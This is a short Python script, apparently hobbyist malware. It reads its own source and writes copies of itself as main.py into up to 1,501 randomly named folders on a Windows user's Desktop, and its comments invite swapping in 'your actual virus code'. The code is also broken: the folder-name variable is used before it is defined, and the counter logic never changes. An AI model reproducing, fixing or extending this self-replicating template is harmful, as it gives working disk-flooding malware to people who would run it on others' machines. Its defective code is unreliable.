import os
import random
import getpass as gp 

script = __file__

file = open(script, 'r')
virus = file.read() # could be modified to hold your actual virus code
file.close()

user = gp.getuser() # gets user of the OS
location = r'C:\Users\{0}\Desktop\\'.format(user) #  where to replicate // written for windows path can change

# Replication function
def replicate(folder):
    os.chdir(folder)
    file = open('main.py', 'w+')
    file.write(virus)
    file.close()
    os.chdir(location)
    
replication_amount = 1500 # set how many times to replicate, 1500 for testing purposes

alpha = 'xyzlksdjf'   # Assuming this is just filler for the files as well as
numeric = '0123456789' # This one

length = [6, 8, 10, 12, 14] # increases the length of each file

for replication in range(replication_amount + 1):  # Increases replication
    alpha_count = 0  # Can be changed because possible filler
    len = random.choice(length)  # length of the string i do believe will test more later
    for _ in range(len):
        if alpha_count != 0:
            alpha_count += 1 # filler
            hexadec += random.choice(alpha) # combination of alpha numeric
        else:
            hexadec += random.choice(numeric) # combination of alpha numeric
            
    try:
        os.mkdir(hexadec)  # makes file directory (spawns a random folder with text and numbers)
        replicate(hexadec) # Replicates it
     
    except Exception as Error:
        print(Error)